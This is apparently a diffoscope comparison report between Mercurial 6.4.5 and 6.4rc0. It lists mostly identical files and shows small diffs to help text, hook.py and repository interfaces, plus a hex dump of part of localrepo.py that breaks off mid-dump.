
 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/grep.py` & `mercurial-6.4rc0/mercurial/grep.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/hbisect.py` & `mercurial-6.4rc0/mercurial/hbisect.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/help.py` & `mercurial-6.4rc0/mercurial/help.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/helptext/bundlespec.txt` & `mercurial-6.4rc0/mercurial/helptext/bundlespec.txt`

 * *Files 5% similar despite different names*

```diff
@@ -63,18 +63,14 @@
 Available Compression Engines
 =============================
 
 The following bundle <compression> engines can be used:
 
 .. bundlecompressionmarker
 
-The compression engines can be prepended with ``stream`` to create a streaming bundle.
-These are bundles that are extremely efficient to produce and consume,
-but do not have guaranteed compatibility with older clients.
-
 Available Options
 =================
 
 The following options exist:
 
 changegroup
     Include the changegroup data in the bundle (default to True).
@@ -89,14 +85,15 @@
 
 phases
     Include phase information relevant to the bundled changesets.
 
 revbranchcache
     Include the "tags-fnodes" cache inside the bundle.
 
+
 tagsfnodescache
     Include the "tags-fnodes" cache inside the bundle.
 
 
 Examples
 ========
 
@@ -108,14 +105,7 @@
 
 ``zstd-v2``
     Produce a ``v2`` bundle with zstandard compression using default
     settings.
 
 ``zstd-v1``
     This errors because ``zstd`` is not supported for ``v1`` types.
-
-``none-streamv2``
-    Produce a ``v2`` streaming bundle with no compression.
-
-``zstd-v2;obsolescence=true;phases=true``
-    Produce a ``v2`` bundle with zstandard compression which includes
-    obsolescence markers and phases.
```

### Comparing `mercurial-6.4.5/mercurial/helptext/color.txt` & `mercurial-6.4rc0/mercurial/helptext/color.txt`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/helptext/config.txt` & `mercurial-6.4rc0/mercurial/helptext/config.txt`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/helptext/dates.txt` & `mercurial-6.4rc0/mercurial/helptext/dates.txt`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/helptext/deprecated.txt` & `mercurial-6.4rc0/mercurial/helptext/deprecated.txt`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/helptext/diffs.txt` & `mercurial-6.4rc0/mercurial/helptext/diffs.txt`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/helptext/environment.txt` & `mercurial-6.4rc0/mercurial/helptext/environment.txt`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/helptext/evolution.txt` & `mercurial-6.4rc0/mercurial/helptext/evolution.txt`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/helptext/extensions.txt` & `mercurial-6.4rc0/mercurial/helptext/extensions.txt`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/helptext/filesets.txt` & `mercurial-6.4rc0/mercurial/helptext/filesets.txt`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/helptext/flags.txt` & `mercurial-6.4rc0/mercurial/helptext/flags.txt`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/helptext/glossary.txt` & `mercurial-6.4rc0/mercurial/helptext/glossary.txt`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/helptext/hg-ssh.8.txt` & `mercurial-6.4rc0/mercurial/helptext/hg-ssh.8.txt`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/helptext/hg.1.txt` & `mercurial-6.4rc0/mercurial/helptext/hg.1.txt`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/helptext/hgignore.5.txt` & `mercurial-6.4rc0/mercurial/helptext/hgignore.5.txt`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/helptext/hgignore.txt` & `mercurial-6.4rc0/mercurial/helptext/hgignore.txt`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/helptext/hgrc.5.txt` & `mercurial-6.4rc0/mercurial/helptext/hgrc.5.txt`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/helptext/hgweb.txt` & `mercurial-6.4rc0/mercurial/helptext/hgweb.txt`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/helptext/internals/bid-merge.txt` & `mercurial-6.4rc0/mercurial/helptext/internals/bid-merge.txt`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/helptext/internals/bundle2.txt` & `mercurial-6.4rc0/mercurial/helptext/internals/bundle2.txt`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/helptext/internals/bundles.txt` & `mercurial-6.4rc0/mercurial/helptext/internals/bundles.txt`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/helptext/internals/cbor.txt` & `mercurial-6.4rc0/mercurial/helptext/internals/cbor.txt`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/helptext/internals/censor.txt` & `mercurial-6.4rc0/mercurial/helptext/internals/censor.txt`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/helptext/internals/changegroups.txt` & `mercurial-6.4rc0/mercurial/helptext/internals/changegroups.txt`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/helptext/internals/config.txt` & `mercurial-6.4rc0/mercurial/helptext/internals/config.txt`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/helptext/internals/dirstate-v2.txt` & `mercurial-6.4rc0/mercurial/helptext/internals/dirstate-v2.txt`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/helptext/internals/extensions.txt` & `mercurial-6.4rc0/mercurial/helptext/internals/extensions.txt`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/helptext/internals/linelog.txt` & `mercurial-6.4rc0/mercurial/helptext/internals/linelog.txt`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/helptext/internals/mergestate.txt` & `mercurial-6.4rc0/mercurial/helptext/internals/mergestate.txt`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/helptext/internals/requirements.txt` & `mercurial-6.4rc0/mercurial/helptext/internals/requirements.txt`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/helptext/internals/revlogs.txt` & `mercurial-6.4rc0/mercurial/helptext/internals/revlogs.txt`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/helptext/internals/wireprotocol.txt` & `mercurial-6.4rc0/mercurial/helptext/internals/wireprotocol.txt`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/helptext/internals/wireprotocolrpc.txt` & `mercurial-6.4rc0/mercurial/helptext/internals/wireprotocolrpc.txt`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/helptext/internals/wireprotocolv2.txt` & `mercurial-6.4rc0/mercurial/helptext/internals/wireprotocolv2.txt`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/helptext/merge-tools.txt` & `mercurial-6.4rc0/mercurial/helptext/merge-tools.txt`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/helptext/pager.txt` & `mercurial-6.4rc0/mercurial/helptext/pager.txt`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/helptext/patterns.txt` & `mercurial-6.4rc0/mercurial/helptext/patterns.txt`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/helptext/phases.txt` & `mercurial-6.4rc0/mercurial/helptext/phases.txt`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/helptext/revisions.txt` & `mercurial-6.4rc0/mercurial/helptext/revisions.txt`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/helptext/rust.txt` & `mercurial-6.4rc0/mercurial/helptext/rust.txt`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/helptext/scripting.txt` & `mercurial-6.4rc0/mercurial/helptext/scripting.txt`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/helptext/subrepos.txt` & `mercurial-6.4rc0/mercurial/helptext/subrepos.txt`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/helptext/templates.txt` & `mercurial-6.4rc0/mercurial/helptext/templates.txt`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/helptext/urls.txt` & `mercurial-6.4rc0/mercurial/helptext/urls.txt`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/hg.py` & `mercurial-6.4rc0/mercurial/hg.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/hgweb/__init__.py` & `mercurial-6.4rc0/mercurial/hgweb/__init__.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/hgweb/common.py` & `mercurial-6.4rc0/mercurial/hgweb/common.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/hgweb/hgweb_mod.py` & `mercurial-6.4rc0/mercurial/hgweb/hgweb_mod.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/hgweb/hgwebdir_mod.py` & `mercurial-6.4rc0/mercurial/hgweb/hgwebdir_mod.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/hgweb/request.py` & `mercurial-6.4rc0/mercurial/hgweb/request.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/hgweb/server.py` & `mercurial-6.4rc0/mercurial/hgweb/server.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/hgweb/webcommands.py` & `mercurial-6.4rc0/mercurial/hgweb/webcommands.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/hgweb/webutil.py` & `mercurial-6.4rc0/mercurial/hgweb/webutil.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/hgweb/wsgicgi.py` & `mercurial-6.4rc0/mercurial/hgweb/wsgicgi.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/hgweb/wsgiheaders.py` & `mercurial-6.4rc0/mercurial/hgweb/wsgiheaders.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/hook.py` & `mercurial-6.4rc0/mercurial/hook.py`

 * *Files 2% similar despite different names*

```diff
@@ -187,19 +187,14 @@
 
     if repo:
         cwd = repo.root
     else:
         cwd = encoding.getcwd()
     r = ui.system(cmd, environ=env, cwd=cwd, blockedtag=b'exthook-%s' % (name,))
 
-    if repo is not None and repo.currentwlock() is None:
-        repo.invalidatedirstate()
-    if repo is not None and repo.currentlock() is None:
-        repo.invalidate()
-
     duration = util.timer() - starttime
     ui.log(
         b'exthook',
         b'exthook-%s: %s finished in %0.2f seconds\n',
         name,
         cmd,
         duration,
```

### Comparing `mercurial-6.4.5/mercurial/httpconnection.py` & `mercurial-6.4rc0/mercurial/httpconnection.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/httppeer.py` & `mercurial-6.4rc0/mercurial/httppeer.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/i18n.py` & `mercurial-6.4rc0/mercurial/i18n.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/interfaces/dirstate.py` & `mercurial-6.4rc0/mercurial/interfaces/dirstate.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/interfaces/repository.py` & `mercurial-6.4rc0/mercurial/interfaces/repository.py`

 * *Files 0% similar despite different names*

```diff
@@ -1520,18 +1520,14 @@
         """
     )
 
     filtername = interfaceutil.Attribute(
         """Name of the repoview that is active on this repo."""
     )
 
-    vfs_map = interfaceutil.Attribute(
-        """a bytes-key  vfs mapping used by transaction and others"""
-    )
-
     wvfs = interfaceutil.Attribute(
         """VFS used to access the working directory."""
     )
 
     vfs = interfaceutil.Attribute(
         """VFS rooted at the .hg directory.
 
@@ -1806,17 +1802,14 @@
 
     def invalidateall():
         pass
 
     def lock(wait=True):
         """Lock the repository store and return a lock instance."""
 
-    def currentlock():
-        """Return the lock if it's held or None."""
-
     def wlock(wait=True):
         """Lock the non-store parts of the repository."""
 
     def currentwlock():
         """Return the wlock if it's held or None."""
 
     def checkcommitpatterns(wctx, match, status, fail):
```

### Comparing `mercurial-6.4.5/mercurial/interfaces/util.py` & `mercurial-6.4rc0/mercurial/interfaces/util.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/keepalive.py` & `mercurial-6.4rc0/mercurial/keepalive.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/linelog.py` & `mercurial-6.4rc0/mercurial/linelog.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/localrepo.py` & `mercurial-6.4rc0/mercurial/localrepo.py`

 * *Files 1% similar despite different names*

```diff
@@ -2623,6599 +2623,6552 @@
 0000a3e0: 696e 6720 7265 766c 6f67 732e 2222 220a  ing revlogs.""".
 0000a3f0: 0a20 2020 2064 6566 2066 696c 6528 7365  .    def file(se
 0000a400: 6c66 2c20 7061 7468 293a 0a20 2020 2020  lf, path):.     
 0000a410: 2020 2069 6620 7061 7468 2e73 7461 7274     if path.start
 0000a420: 7377 6974 6828 6227 2f27 293a 0a20 2020  swith(b'/'):.   
 0000a430: 2020 2020 2020 2020 2070 6174 6820 3d20           path = 
 0000a440: 7061 7468 5b31 3a5d 0a0a 2020 2020 2020  path[1:]..      
-0000a450: 2020 7472 795f 7370 6c69 7420 3d20 280a    try_split = (.
-0000a460: 2020 2020 2020 2020 2020 2020 7365 6c66              self
-0000a470: 2e63 7572 7265 6e74 7472 616e 7361 6374  .currenttransact
-0000a480: 696f 6e28 2920 6973 206e 6f74 204e 6f6e  ion() is not Non
-0000a490: 650a 2020 2020 2020 2020 2020 2020 6f72  e.            or
-0000a4a0: 2074 786e 7574 696c 2e6d 6179 6861 7665   txnutil.mayhave
-0000a4b0: 7065 6e64 696e 6728 7365 6c66 2e72 6f6f  pending(self.roo
-0000a4c0: 7429 0a20 2020 2020 2020 2029 0a0a 2020  t).        )..  
-0000a4d0: 2020 2020 2020 7265 7475 726e 2066 696c        return fil
-0000a4e0: 656c 6f67 2e66 696c 656c 6f67 2873 656c  elog.filelog(sel
-0000a4f0: 662e 7376 6673 2c20 7061 7468 2c20 7472  f.svfs, path, tr
-0000a500: 795f 7370 6c69 743d 7472 795f 7370 6c69  y_split=try_spli
-0000a510: 7429 0a0a 0a40 696e 7465 7266 6163 6575  t)...@interfaceu
-0000a520: 7469 6c2e 696d 706c 656d 656e 7465 7228  til.implementer(
-0000a530: 7265 706f 7369 746f 7279 2e69 6c6f 6361  repository.iloca
-0000a540: 6c72 6570 6f73 6974 6f72 7966 696c 6573  lrepositoryfiles
-0000a550: 746f 7261 6765 290a 636c 6173 7320 7265  torage).class re
-0000a560: 766c 6f67 6e61 7272 6f77 6669 6c65 7374  vlognarrowfilest
-0000a570: 6f72 6167 653a 0a20 2020 2022 2222 4669  orage:.    """Fi
-0000a580: 6c65 2073 746f 7261 6765 2077 6865 6e20  le storage when 
-0000a590: 7573 696e 6720 7265 766c 6f67 7320 616e  using revlogs an
-0000a5a0: 6420 6e61 7272 6f77 2066 696c 6573 2e22  d narrow files."
-0000a5b0: 2222 0a0a 2020 2020 6465 6620 6669 6c65  ""..    def file
-0000a5c0: 2873 656c 662c 2070 6174 6829 3a0a 2020  (self, path):.  
-0000a5d0: 2020 2020 2020 6966 2070 6174 682e 7374        if path.st
-0000a5e0: 6172 7473 7769 7468 2862 272f 2729 3a0a  artswith(b'/'):.
-0000a5f0: 2020 2020 2020 2020 2020 2020 7061 7468              path
-0000a600: 203d 2070 6174 685b 313a 5d0a 0a20 2020   = path[1:]..   
-0000a610: 2020 2020 2074 7279 5f73 706c 6974 203d       try_split =
-0000a620: 2028 0a20 2020 2020 2020 2020 2020 2073   (.            s
-0000a630: 656c 662e 6375 7272 656e 7474 7261 6e73  elf.currenttrans
-0000a640: 6163 7469 6f6e 2829 2069 7320 6e6f 7420  action() is not 
-0000a650: 4e6f 6e65 0a20 2020 2020 2020 2020 2020  None.           
-0000a660: 206f 7220 7478 6e75 7469 6c2e 6d61 7968   or txnutil.mayh
-0000a670: 6176 6570 656e 6469 6e67 2873 656c 662e  avepending(self.
-0000a680: 726f 6f74 290a 2020 2020 2020 2020 290a  root).        ).
-0000a690: 2020 2020 2020 2020 7265 7475 726e 2066          return f
-0000a6a0: 696c 656c 6f67 2e6e 6172 726f 7766 696c  ilelog.narrowfil
-0000a6b0: 656c 6f67 280a 2020 2020 2020 2020 2020  elog(.          
-0000a6c0: 2020 7365 6c66 2e73 7666 732c 2070 6174    self.svfs, pat
-0000a6d0: 682c 2073 656c 662e 5f73 746f 7265 6e61  h, self._storena
-0000a6e0: 7272 6f77 6d61 7463 682c 2074 7279 5f73  rrowmatch, try_s
-0000a6f0: 706c 6974 3d74 7279 5f73 706c 6974 0a20  plit=try_split. 
-0000a700: 2020 2020 2020 2029 0a0a 0a64 6566 206d         )...def m
-0000a710: 616b 6566 696c 6573 746f 7261 6765 2872  akefilestorage(r
-0000a720: 6571 7569 7265 6d65 6e74 732c 2066 6561  equirements, fea
-0000a730: 7475 7265 732c 202a 2a6b 7761 7267 7329  tures, **kwargs)
-0000a740: 3a0a 2020 2020 2222 2250 726f 6475 6365  :.    """Produce
-0000a750: 2061 2074 7970 6520 636f 6e66 6f72 6d69   a type conformi
-0000a760: 6e67 2074 6f20 6060 696c 6f63 616c 7265  ng to ``ilocalre
-0000a770: 706f 7369 746f 7279 6669 6c65 7374 6f72  positoryfilestor
-0000a780: 6167 6560 602e 2222 220a 2020 2020 6665  age``.""".    fe
-0000a790: 6174 7572 6573 2e61 6464 2872 6570 6f73  atures.add(repos
-0000a7a0: 6974 6f72 792e 5245 504f 5f46 4541 5455  itory.REPO_FEATU
-0000a7b0: 5245 5f52 4556 4c4f 475f 4649 4c45 5f53  RE_REVLOG_FILE_S
-0000a7c0: 544f 5241 4745 290a 2020 2020 6665 6174  TORAGE).    feat
-0000a7d0: 7572 6573 2e61 6464 2872 6570 6f73 6974  ures.add(reposit
-0000a7e0: 6f72 792e 5245 504f 5f46 4541 5455 5245  ory.REPO_FEATURE
-0000a7f0: 5f53 5452 4541 4d5f 434c 4f4e 4529 0a0a  _STREAM_CLONE)..
-0000a800: 2020 2020 6966 2072 6571 7569 7265 6d65      if requireme
-0000a810: 6e74 736d 6f64 2e4e 4152 524f 575f 5245  ntsmod.NARROW_RE
-0000a820: 5155 4952 454d 454e 5420 696e 2072 6571  QUIREMENT in req
-0000a830: 7569 7265 6d65 6e74 733a 0a20 2020 2020  uirements:.     
-0000a840: 2020 2072 6574 7572 6e20 7265 766c 6f67     return revlog
-0000a850: 6e61 7272 6f77 6669 6c65 7374 6f72 6167  narrowfilestorag
-0000a860: 650a 2020 2020 656c 7365 3a0a 2020 2020  e.    else:.    
-0000a870: 2020 2020 7265 7475 726e 2072 6576 6c6f      return revlo
-0000a880: 6766 696c 6573 746f 7261 6765 0a0a 0a23  gfilestorage...#
-0000a890: 204c 6973 7420 6f66 2072 6570 6f73 6974   List of reposit
-0000a8a0: 6f72 7920 696e 7465 7266 6163 6573 2061  ory interfaces a
-0000a8b0: 6e64 2066 6163 746f 7279 2066 756e 6374  nd factory funct
-0000a8c0: 696f 6e73 2066 6f72 2074 6865 6d2e 2045  ions for them. E
-0000a8d0: 6163 680a 2320 7769 6c6c 2062 6520 6361  ach.# will be ca
-0000a8e0: 6c6c 6564 2069 6e20 6f72 6465 7220 6475  lled in order du
-0000a8f0: 7269 6e67 2060 606d 616b 656c 6f63 616c  ring ``makelocal
-0000a900: 7265 706f 7369 746f 7279 2829 6060 2074  repository()`` t
-0000a910: 6f20 6974 6572 6174 6976 656c 790a 2320  o iteratively.# 
-0000a920: 6465 7269 7665 2074 6865 2066 696e 616c  derive the final
-0000a930: 2074 7970 6520 666f 7220 6120 6c6f 6361   type for a loca
-0000a940: 6c20 7265 706f 7369 746f 7279 2069 6e73  l repository ins
-0000a950: 7461 6e63 652e 2057 6520 6361 7074 7572  tance. We captur
-0000a960: 6520 7468 650a 2320 6675 6e63 7469 6f6e  e the.# function
-0000a970: 2061 7320 6120 6c61 6d62 6461 2073 6f20   as a lambda so 
-0000a980: 7765 2064 6f6e 2774 2068 6f6c 6420 6120  we don't hold a 
-0000a990: 7265 6665 7265 6e63 6520 616e 6420 7468  reference and th
-0000a9a0: 6520 6d6f 6475 6c65 2d6c 6576 656c 0a23  e module-level.#
-0000a9b0: 2066 756e 6374 696f 6e73 2063 616e 2062   functions can b
-0000a9c0: 6520 7772 6170 7065 642e 0a52 4550 4f5f  e wrapped..REPO_
-0000a9d0: 494e 5445 5246 4143 4553 203d 205b 0a20  INTERFACES = [. 
-0000a9e0: 2020 2028 7265 706f 7369 746f 7279 2e69     (repository.i
-0000a9f0: 6c6f 6361 6c72 6570 6f73 6974 6f72 796d  localrepositorym
-0000aa00: 6169 6e2c 206c 616d 6264 613a 206d 616b  ain, lambda: mak
-0000aa10: 656d 6169 6e29 2c0a 2020 2020 2872 6570  emain),.    (rep
-0000aa20: 6f73 6974 6f72 792e 696c 6f63 616c 7265  ository.ilocalre
-0000aa30: 706f 7369 746f 7279 6669 6c65 7374 6f72  positoryfilestor
-0000aa40: 6167 652c 206c 616d 6264 613a 206d 616b  age, lambda: mak
-0000aa50: 6566 696c 6573 746f 7261 6765 292c 0a5d  efilestorage),.]
-0000aa60: 0a0a 0a40 696e 7465 7266 6163 6575 7469  ...@interfaceuti
-0000aa70: 6c2e 696d 706c 656d 656e 7465 7228 7265  l.implementer(re
-0000aa80: 706f 7369 746f 7279 2e69 6c6f 6361 6c72  pository.ilocalr
-0000aa90: 6570 6f73 6974 6f72 796d 6169 6e29 0a63  epositorymain).c
-0000aaa0: 6c61 7373 206c 6f63 616c 7265 706f 7369  lass localreposi
-0000aab0: 746f 7279 3a0a 2020 2020 2222 224d 6169  tory:.    """Mai
-0000aac0: 6e20 636c 6173 7320 666f 7220 7265 7072  n class for repr
-0000aad0: 6573 656e 7469 6e67 206c 6f63 616c 2072  esenting local r
-0000aae0: 6570 6f73 6974 6f72 6965 732e 0a0a 2020  epositories...  
-0000aaf0: 2020 416c 6c20 6c6f 6361 6c20 7265 706f    All local repo
-0000ab00: 7369 746f 7269 6573 2061 7265 2069 6e73  sitories are ins
-0000ab10: 7461 6e63 6573 206f 6620 7468 6973 2063  tances of this c
-0000ab20: 6c61 7373 2e0a 0a20 2020 2043 6f6e 7374  lass...    Const
-0000ab30: 7275 6374 6564 206f 6e20 6974 7320 6f77  ructed on its ow
-0000ab40: 6e2c 2069 6e73 7461 6e63 6573 206f 6620  n, instances of 
-0000ab50: 7468 6973 2063 6c61 7373 2061 7265 206e  this class are n
-0000ab60: 6f74 2075 7361 626c 6520 6173 0a20 2020  ot usable as.   
-0000ab70: 2072 6570 6f73 6974 6f72 7920 6f62 6a65   repository obje
-0000ab80: 6374 732e 2054 6f20 6f62 7461 696e 2061  cts. To obtain a
-0000ab90: 2075 7361 626c 6520 7265 706f 7369 746f   usable reposito
-0000aba0: 7279 206f 626a 6563 742c 2063 616c 6c0a  ry object, call.
-0000abb0: 2020 2020 6060 6867 2e72 6570 6f73 6974      ``hg.reposit
-0000abc0: 6f72 7928 2960 602c 2060 606c 6f63 616c  ory()``, ``local
-0000abd0: 7265 706f 2e69 6e73 7461 6e63 6528 2960  repo.instance()`
-0000abe0: 602c 206f 720a 2020 2020 6060 6c6f 6361  `, or.    ``loca
-0000abf0: 6c72 6570 6f2e 6d61 6b65 6c6f 6361 6c72  lrepo.makelocalr
-0000ac00: 6570 6f73 6974 6f72 7928 2960 602e 2054  epository()``. T
-0000ac10: 6865 206c 6174 7465 7220 6973 2074 6865  he latter is the
-0000ac20: 206c 6f77 6573 742d 6c65 7665 6c2e 0a20   lowest-level.. 
-0000ac30: 2020 2060 6069 6e73 7461 6e63 6528 2960     ``instance()`
-0000ac40: 6020 6164 6473 2073 7570 706f 7274 2066  ` adds support f
-0000ac50: 6f72 2063 7265 6174 696e 6720 6e65 7720  or creating new 
-0000ac60: 7265 706f 7369 746f 7269 6573 2e0a 2020  repositories..  
-0000ac70: 2020 6060 6867 2e72 6570 6f73 6974 6f72    ``hg.repositor
-0000ac80: 7928 2960 6020 6164 6473 206d 6f72 6520  y()`` adds more 
-0000ac90: 6578 7465 6e73 696f 6e20 696e 7465 6772  extension integr
-0000aca0: 6174 696f 6e2c 2069 6e63 6c75 6469 6e67  ation, including
-0000acb0: 2063 616c 6c69 6e67 0a20 2020 2060 6072   calling.    ``r
-0000acc0: 6570 6f73 6574 7570 2829 6060 2e20 4765  eposetup()``. Ge
-0000acd0: 6e65 7261 6c6c 7920 7370 6561 6b69 6e67  nerally speaking
-0000ace0: 2c20 6060 6867 2e72 6570 6f73 6974 6f72  , ``hg.repositor
-0000acf0: 7928 2960 6020 7368 6f75 6c64 2062 650a  y()`` should be.
-0000ad00: 2020 2020 7573 6564 2e0a 2020 2020 2222      used..    ""
-0000ad10: 220a 0a20 2020 205f 6261 7365 7375 7070  "..    _basesupp
-0000ad20: 6f72 7465 6420 3d20 7b0a 2020 2020 2020  orted = {.      
-0000ad30: 2020 7265 7175 6972 656d 656e 7473 6d6f    requirementsmo
-0000ad40: 642e 4152 4348 4956 4544 5f50 4841 5345  d.ARCHIVED_PHASE
-0000ad50: 5f52 4551 5549 5245 4d45 4e54 2c0a 2020  _REQUIREMENT,.  
-0000ad60: 2020 2020 2020 7265 7175 6972 656d 656e        requiremen
-0000ad70: 7473 6d6f 642e 424f 4f4b 4d41 524b 535f  tsmod.BOOKMARKS_
-0000ad80: 494e 5f53 544f 5245 5f52 4551 5549 5245  IN_STORE_REQUIRE
-0000ad90: 4d45 4e54 2c0a 2020 2020 2020 2020 7265  MENT,.        re
-0000ada0: 7175 6972 656d 656e 7473 6d6f 642e 4348  quirementsmod.CH
-0000adb0: 414e 4745 4c4f 4756 325f 5245 5155 4952  ANGELOGV2_REQUIR
-0000adc0: 454d 454e 542c 0a20 2020 2020 2020 2072  EMENT,.        r
-0000add0: 6571 7569 7265 6d65 6e74 736d 6f64 2e43  equirementsmod.C
-0000ade0: 4f50 4945 5353 4443 5f52 4551 5549 5245  OPIESSDC_REQUIRE
-0000adf0: 4d45 4e54 2c0a 2020 2020 2020 2020 7265  MENT,.        re
-0000ae00: 7175 6972 656d 656e 7473 6d6f 642e 4449  quirementsmod.DI
-0000ae10: 5253 5441 5445 5f54 5241 434b 4544 5f48  RSTATE_TRACKED_H
-0000ae20: 494e 545f 5631 2c0a 2020 2020 2020 2020  INT_V1,.        
-0000ae30: 7265 7175 6972 656d 656e 7473 6d6f 642e  requirementsmod.
-0000ae40: 4449 5253 5441 5445 5f56 325f 5245 5155  DIRSTATE_V2_REQU
-0000ae50: 4952 454d 454e 542c 0a20 2020 2020 2020  IREMENT,.       
-0000ae60: 2072 6571 7569 7265 6d65 6e74 736d 6f64   requirementsmod
-0000ae70: 2e44 4f54 454e 434f 4445 5f52 4551 5549  .DOTENCODE_REQUI
-0000ae80: 5245 4d45 4e54 2c0a 2020 2020 2020 2020  REMENT,.        
-0000ae90: 7265 7175 6972 656d 656e 7473 6d6f 642e  requirementsmod.
-0000aea0: 464e 4341 4348 455f 5245 5155 4952 454d  FNCACHE_REQUIREM
-0000aeb0: 454e 542c 0a20 2020 2020 2020 2072 6571  ENT,.        req
-0000aec0: 7569 7265 6d65 6e74 736d 6f64 2e47 454e  uirementsmod.GEN
-0000aed0: 4552 414c 4445 4c54 415f 5245 5155 4952  ERALDELTA_REQUIR
-0000aee0: 454d 454e 542c 0a20 2020 2020 2020 2072  EMENT,.        r
-0000aef0: 6571 7569 7265 6d65 6e74 736d 6f64 2e49  equirementsmod.I
-0000af00: 4e54 4552 4e41 4c5f 5048 4153 455f 5245  NTERNAL_PHASE_RE
-0000af10: 5155 4952 454d 454e 542c 0a20 2020 2020  QUIREMENT,.     
-0000af20: 2020 2072 6571 7569 7265 6d65 6e74 736d     requirementsm
-0000af30: 6f64 2e4e 4f44 454d 4150 5f52 4551 5549  od.NODEMAP_REQUI
-0000af40: 5245 4d45 4e54 2c0a 2020 2020 2020 2020  REMENT,.        
-0000af50: 7265 7175 6972 656d 656e 7473 6d6f 642e  requirementsmod.
-0000af60: 5245 4c41 5449 5645 5f53 4841 5245 445f  RELATIVE_SHARED_
-0000af70: 5245 5155 4952 454d 454e 542c 0a20 2020  REQUIREMENT,.   
-0000af80: 2020 2020 2072 6571 7569 7265 6d65 6e74       requirement
-0000af90: 736d 6f64 2e52 4556 4c4f 4756 315f 5245  smod.REVLOGV1_RE
-0000afa0: 5155 4952 454d 454e 542c 0a20 2020 2020  QUIREMENT,.     
-0000afb0: 2020 2072 6571 7569 7265 6d65 6e74 736d     requirementsm
-0000afc0: 6f64 2e52 4556 4c4f 4756 325f 5245 5155  od.REVLOGV2_REQU
-0000afd0: 4952 454d 454e 542c 0a20 2020 2020 2020  IREMENT,.       
-0000afe0: 2072 6571 7569 7265 6d65 6e74 736d 6f64   requirementsmod
-0000aff0: 2e53 4841 5245 445f 5245 5155 4952 454d  .SHARED_REQUIREM
-0000b000: 454e 542c 0a20 2020 2020 2020 2072 6571  ENT,.        req
-0000b010: 7569 7265 6d65 6e74 736d 6f64 2e53 4841  uirementsmod.SHA
-0000b020: 5245 5341 4645 5f52 4551 5549 5245 4d45  RESAFE_REQUIREME
-0000b030: 4e54 2c0a 2020 2020 2020 2020 7265 7175  NT,.        requ
-0000b040: 6972 656d 656e 7473 6d6f 642e 5350 4152  irementsmod.SPAR
